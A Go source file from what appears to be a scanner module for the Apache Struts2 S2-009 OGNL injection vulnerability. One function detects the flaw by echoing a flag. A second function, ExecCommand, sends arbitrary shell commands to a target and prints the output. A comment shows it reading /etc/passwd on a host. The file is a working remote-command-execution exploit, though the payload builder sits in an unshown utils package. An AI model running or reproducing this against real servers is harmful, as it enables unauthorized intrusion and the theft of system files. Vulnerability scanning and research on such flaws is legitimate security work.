package s2_009

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "net/url"
    "strings"
)

/*
s2-009检测方式：
    指定get参数名
    在模块这儿一次梳理好payload。
ST2SG.exe --url http://192.168.123.128:8080/S2-009/ajax/example5.action --mode exec --vn 9 --data "name" --cmd "cat /etc/passwd"
*/

func Check(targetUrl string, getParam string) {
    targetUrl = targetUrl + utils.POC_s009_exec(getParam, "echo%20"+utils.Checkflag)
    respString := utils.GetFunc4Struts2(targetUrl, "", "")
    if utils.IfContainsStr(respString, utils.Checkflag) {
        color.Red("*Found Struts2-009！")
    } else {
        fmt.Println("Struts2-009 Not Vulnerable.")
    }
}
func ExecCommand(targetUrl string, command string, getParam string) {
    targetUrl = targetUrl + utils.POC_s009_exec(getParam, url.QueryEscape(command))
    respString := utils.GetFunc4Struts2(targetUrl, "", "")
    respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
    fmt.Println(url.QueryUnescape(respString))
}
